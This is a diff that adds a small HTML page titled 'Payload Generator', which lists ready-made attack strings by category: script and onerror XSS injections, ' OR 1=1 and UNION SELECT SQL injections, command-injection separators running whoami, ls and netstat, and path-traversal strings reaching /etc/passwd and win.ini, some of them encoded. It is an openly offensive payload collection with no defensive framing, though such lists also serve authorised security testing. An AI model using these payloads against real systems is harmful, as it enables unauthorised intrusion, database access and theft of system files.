@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Payload Generator</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <style>
+    body {
+      background-color: #0d0d0d;
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
+    }
+    select, textarea {
+      background-color: #000;
+      border: 1px solid #00ff00;
+      color: #00ff00;
+    }
+  </style>
+</head>
+<body class="min-h-screen p-8">
+  <h1 class="text-4xl font-bold mb-6 text-center">Payload Generator</h1>
+
+  <div class="max-w-4xl mx-auto space-y-6">
+    <div class="flex gap-4">
+      <select id="type" class="p-2 rounded">
+        <option value="xss">XSS</option>
+        <option value="sqli">SQL Injection</option>
+        <option value="cmd">Command Injection</option>
+        <option value="path">Path Traversal</option>
+      </select>
+      <button onclick="generatePayloads()" class="bg-green-500 hover:bg-green-700 text-black font-bold px-4 py-2 rounded">Generate</button>
+      <button onclick="clearOutput()" class="bg-red-600 hover:bg-red-800 text-white px-4 py-2 rounded font-bold">Clear</button>
+    </div>
+
+    <textarea id="output" rows="15" class="w-full p-4 rounded" readonly placeholder="Payloads will appear here..."></textarea>
+  </div>
+
+  <script>
+    const payloads = {
+      xss: [
+        `<script>alert(1)</script>`,
+        `"><script>alert('XSS')</script>`,
+        `<img src=x onerror=alert(1)>`,
+        `<svg/onload=alert(1)>`
+      ],
+      sqli: [
+        `' OR '1'='1`,
+        `' OR 1=1--`,
+        `" OR "" = "`,
+        `' UNION SELECT null, version() --`
+      ],
+      cmd: [
+        `; ls -la`,
+        `| whoami`,
+        `& ping 127.0.0.1`,
+        `&& netstat -an`
+      ],
+      path: [
+        `../../../../etc/passwd`,
+        `..\\..\\..\\windows\\win.ini`,
+        `%2e%2e%2f`,
+        `..%c0%af..%c0%afetc/passwd`
+      ]
+    };
+
+    function generatePayloads() {
+      const type = document.getElementById('type').value;
+      const outputBox = document.getElementById('output');
+      const result = payloads[type].join('\n');
+      outputBox.value = result;
+    }
+
+    function clearOutput() {
+      document.getElementById('output').value = '';
+    }
+  </script>
+</body>
+</html>
